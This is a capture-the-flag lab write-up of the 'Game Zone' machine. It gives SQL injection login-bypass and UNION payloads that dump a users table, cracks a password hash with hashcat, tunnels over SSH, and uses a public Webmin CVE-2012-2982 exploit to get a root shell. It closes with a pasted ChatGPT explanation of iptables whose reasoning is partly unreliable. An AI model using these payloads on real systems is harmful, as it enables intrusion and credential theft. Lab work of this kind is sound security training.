---
title: "Game Zone"
description: "Enum Nmap : Port 80 Exploit Simple SQL Injection then our simple boolean payload success and we succeed to login, after login we find there is only one feature that’s search"
lang: "en"
translationKey: "game-zone"
category: "lab-writeups"
tags: ["Lab", "Sql Injection", "ssh-tunneling", "webmin", "Linux"]
publishDate: "2024-12-17"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "original"
notionId: "15f5fca1-ed80-801d-b495-e4b4601bd78b"
notionUrl: "https://app.notion.com/p/Game-Zone-15f5fca1ed80801db495e4b4601bd78b"
notionLastEdited: "2025-08-27T02:29:00.000Z"
---

# Enum

Nmap :

![](/images/game-zone/9896414e2a56.png)

## Port 80

![](/images/game-zone/b6959365e195.png)

### Exploit Simple SQL Injection

```bash
# do simple sqli attack on login page
'OR 1=1 #'
```

![](/images/game-zone/3ce14593537d.png)

then our simple boolean payload success and we succeed to login, after login we find there is only one feature that’s search feature.

![](/images/game-zone/ee20581674f1.png)

when we try to input single quotes (’) , it produce an error like this 

![](/images/game-zone/04c4b78f3f4e.png)

from an error message we know that the query which is used by the backend using symbol % so perhaps the full query looks like this 

`select * from tables where game like ‘%’` 

oke now first we try to identify how many columns in the tables using `order by` command

```bash
'ORDER+BY+1#
# increase value 1 till we got an error on the app
```

![](/images/game-zone/d4fa322e118d.png)

oke we got an error on 4, so it means our columns are not more than 4 so let’s we input a value on 3 columns to see the output we want to see, for example I want to see version and user database.

![](/images/game-zone/0b320590c114.png)

oke now let’s we try to dump database.

```bash
# see all database in the system
' union select 1,2, schema_name FROM information_schema.schemata;#'
# see all tables in certain database
' union select 1,2, TABLE_NAME FROM information_schema.TABLES WHERE table_schema='db';#'
# see all columns in certain table
' union select 1,table_name, column_name FROM information_schema.columns WHERE table_name = 'users' ;#'
# dump contents
' union select 1, username , pwd from users;#
```

![](/images/game-zone/bf2da6dcd1b0.png)

`agent47 : ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

### Cracking Hash

Validasi type hash :

![](/images/game-zone/f00ed5b4a52f.png)

![](/images/game-zone/460718fd4a59.png)

oke after 2 times validate the type of the hash, we got SHA2-256, let’s we try to crack it using hashcat

```bash
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt --force
```

![](/images/game-zone/e2bd3dec2fd5.png)

![](/images/game-zone/a9345f9bb587.png)

oke now we got complete credential `agent47 : videogamer124` now let’s we login via ssh

## Port 22

![](/images/game-zone/f49abc30de2c.png)

Running `ss` command will get you a list of listening ports, upon looking at the list you’ll see some didn’t appear on our nmap result because of the firewall.

![](/images/game-zone/2502ca979c30.png)

The result shows port 10000 running webmin but we couldn’t access it due to iptables configurations. In order to make this service accessible, we need to set up a local  tunnel via SSH to forward the port from a remote box to us, that way it can be accessible.

`ssh -L 10000:localhost:10000 agent47@10.10.87.170` 

![](/images/game-zone/5e4cc1da2007.png)

Right after login, we found webmin running `version 1.580`.

![](/images/game-zone/d44d512f3246.png)

## Port 10000 (Webmin)

### Exploit Webmin

we success to login using credential ssh which we have obtained before 

![](/images/game-zone/d3cc640fdebe.png)

and now we exploit the app based on the version using public exploit.

![](/images/game-zone/94e546e0a057.png)

we use this as a reference : [https://github.com/OstojaOfficial/CVE-2012-2982](https://github.com/OstojaOfficial/CVE-2012-2982)

![](/images/game-zone/4f032c8d78a9.png)

voila after succeed to exploit the service we got a root revshell here. and now we don’t need to do **linpriv **anymore and submit the flag.

![](/images/game-zone/062d730737f3.png)

# Bonus

when working on this lab I got a problem and a big question why I only able to port forward using `ssh -L` instead of `chisel` . Then, after getting a root access I do deep exploration about the lab, 

I see the Iptables and found some firewall rules was implemented like this.

![](/images/game-zone/30bc8f52cfcd.png)

next I copied all the rules and submit it into chatgpt to know why my question is.

here is the long explanation but good to know.

Mari kita analisis satu per satu aturan `iptables` yang Anda berikan dan mencoba memahami mengapa Anda hanya dapat melakukan port forwarding melalui `ssh -L` dan bukan dengan **Chisel**.

### 1. **Default Policy Rules:**

```shell
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT

```

- **`P INPUT ACCEPT`**: Menetapkan **default policy** untuk rantai **INPUT** menjadi **ACCEPT**. Ini berarti semua trafik yang masuk (terhadap komputer lokal Anda) akan diterima secara default, kecuali ada aturan lain yang memblokirnya.
- **`P FORWARD ACCEPT`**: Menetapkan default policy untuk rantai **FORWARD** menjadi **ACCEPT**. Ini berarti trafik yang diteruskan (misalnya, jika sistem ini berfungsi sebagai router atau gateway) akan diterima.
- **`P OUTPUT ACCEPT`**: Menetapkan default policy untuk rantai **OUTPUT** menjadi **ACCEPT**. Ini berarti semua trafik keluar dari sistem akan diterima, kecuali ada aturan lain yang memblokirnya.
**Tujuan**: Dengan default policy yang diatur ke **ACCEPT**, ini memungkinkan hampir semua koneksi, baik masuk, keluar, maupun yang diteruskan. Ini membuka akses yang cukup luas ke sistem Anda, yang bisa menjadi masalah jika sistem tidak memiliki aturan keamanan yang lebih ketat.

### 2. **Custom Chain for SSH (f2b-sshd):**

```shell
-N f2b-sshd
-A INPUT -p tcp -m multiport --dports 22 -j f2b-sshd

```

- **`N f2b-sshd`**: Membuat rantai **`f2b-sshd`** yang khusus untuk menangani trafik SSH.
- **`A INPUT -p tcp -m multiport --dports 22 -j f2b-sshd`**: Menambahkan aturan pada rantai **INPUT** yang akan mengarahkan trafik TCP yang ditujukan untuk port **22** (port default untuk SSH) ke rantai **`f2b-sshd`**.
**Tujuan**: Aturan ini menyaring trafik masuk ke port 22 (SSH) dan meneruskannya ke rantai **`f2b-sshd`** untuk pemeriksaan lebih lanjut. Biasanya, **Fail2ban** akan memblokir IP jika ada banyak upaya login gagal melalui SSH.

### 3. **Allow Localhost Access on Port 10000:**

```shell
-A INPUT -i lo -p tcp -m tcp --dport 10000 -j ACCEPT

```

- **`A INPUT -i lo -p tcp -m tcp --dport 10000 -j ACCEPT`**: Menambahkan aturan untuk menerima koneksi TCP ke port 10000 hanya dari **antarmuka loopback (lo)**. Ini berarti hanya proses yang berjalan di mesin lokal yang dapat mengakses port 10000.
**Tujuan**: Aturan ini memungkinkan aplikasi lokal (misalnya, yang berjalan di mesin itu sendiri) untuk mengakses port 10000. Ini bisa digunakan untuk aplikasi yang berkomunikasi dengan port tersebut hanya dari dalam mesin.

### 4. **Reject External Access on Port 10000:**

```shell
-A INPUT -p tcp -m tcp --dport 10000 -j REJECT --reject-with tcp-reset

```

- **`A INPUT -p tcp -m tcp --dport 10000 -j REJECT --reject-with tcp-reset`**: Menambahkan aturan untuk menolak koneksi TCP yang masuk ke port 10000 dari **manapun** dengan **TCP RST**. Ini mengirimkan sinyal reset TCP kepada pengirim, yang memberi tahu mereka bahwa koneksi ditolak.
**Tujuan**: Aturan ini menolak koneksi yang datang ke port 10000 dari sumber selain `localhost`. Biasanya, ini digunakan untuk memblokir akses dari luar (jaringan publik atau LAN) ke port ini, meskipun ada pengecualian untuk `localhost`.

### 5. **Return from Custom SSH Chain:**

```shell
-A f2b-sshd -j RETURN

```

- **`A f2b-sshd -j RETURN`**: Menambahkan aturan di rantai **`f2b-sshd`** yang mengatakan bahwa jika tidak ada aturan lain yang diterapkan, paket akan kembali ke rantai sebelumnya (dalam hal ini, ke rantai **INPUT**).
**Tujuan**: Aturan ini memastikan bahwa jika trafik SSH (port 22) tidak terblokir atau diproses lebih lanjut, itu akan kembali ke rantai **INPUT** untuk diproses lebih lanjut. Ini adalah cara untuk memeriksa aturan berikutnya setelah menambahkan pemrosesan SSH.

---

### **Kenapa Anda Hanya Bisa Melakukan Port Forwarding dengan SSH (****`ssh -L`****) dan Bukan dengan Chisel?**

Ada beberapa alasan mengapa port forwarding menggunakan `ssh -L` bekerja, tetapi tidak dengan **Chisel**:

1. **Pengaturan Firewall untuk Port 10000**:
  - Dalam aturan Anda, port 10000 hanya diizinkan untuk koneksi **loopback (localhost)** dan **ditolak untuk koneksi dari luar**. Ini membatasi aplikasi seperti **Chisel** (yang kemungkinan berjalan pada jaringan eksternal) untuk tidak dapat mengakses port ini.
  - **Chisel** mencoba untuk membuka port pada IP eksternal atau antarmuka jaringan tertentu, namun firewall hanya mengizinkan akses dari `localhost` (antarmuka loopback). Jika Chisel mencoba menggunakan port 10000, paketnya akan ditolak karena aturan `REJECT` yang berlaku untuk port tersebut.

1. **SSH Tunneling (****`ssh -L`****)**:
  - **SSH** menggunakan **port forwarding** untuk mengalihkan koneksi TCP atau UDP dari port tertentu pada mesin lokal ke port di mesin remote (atau sebaliknya).
  - Ketika Anda menggunakan `ssh -L`, Anda memastikan bahwa koneksi pada port lokal (misalnya 10000) diteruskan melalui sesi SSH. Karena SSH menggunakan port 22, yang tidak dibatasi oleh aturan **iptables** di sini, maka port forwarding melalui SSH bisa berjalan tanpa hambatan.

1. **Tidak Ada Pengaturan untuk Chisel dalam ****`iptables`**:
  - `iptables` di sini hanya menangani trafik SSH (port 22) dan port 10000. Tidak ada aturan yang secara eksplisit menangani port yang digunakan oleh **Chisel** (biasanya port yang lebih tinggi, seperti 9000 atau 5000). Jika Anda ingin mengarahkan Chisel untuk bekerja melalui port tertentu, Anda mungkin perlu menambahkan aturan di `iptables` yang mengizinkan lalu lintas melalui port yang digunakan oleh Chisel.
  - **Chisel** mungkin menggunakan port yang lebih tinggi atau port yang tidak diizinkan oleh konfigurasi firewall Anda.

### **Solusi untuk Menggunakan Chisel:**

1. **Izinkan Port yang Digunakan oleh Chisel**:
Anda bisa menambahkan aturan di `iptables` untuk mengizinkan koneksi ke port yang digunakan oleh **Chisel**. Misalnya, jika Chisel berjalan pada port 9000, Anda perlu menambahkan aturan seperti berikut:
  ```shell
  -A INPUT -p tcp --dport 9000 -j ACCEPT

  ```

1. **Periksa dan Atur Ulang Firewall**:
Jika Anda ingin menggunakan Chisel untuk port forwarding, pastikan bahwa firewall tidak membatasi port yang digunakan oleh Chisel atau port tujuan yang ingin Anda tuju. Pastikan Anda mengizinkan akses ke port tersebut untuk semua antarmuka yang relevan.
### **Kesimpulan:**

- **SSH Port Forwarding** berfungsi karena port 22 tidak dibatasi oleh aturan firewall, dan port 10000 hanya dibuka untuk koneksi dari **localhost**.
- **Chisel** tidak bekerja karena **port 10000 diblokir** untuk koneksi eksternal, dan **Chisel** tidak secara otomatis mendukung port yang dibuka oleh konfigurasi `iptables` saat ini.
- Solusi: Anda harus menyesuaikan aturan firewall untuk **mengizinkan Chisel** atau port yang digunakan oleh aplikasi Anda.
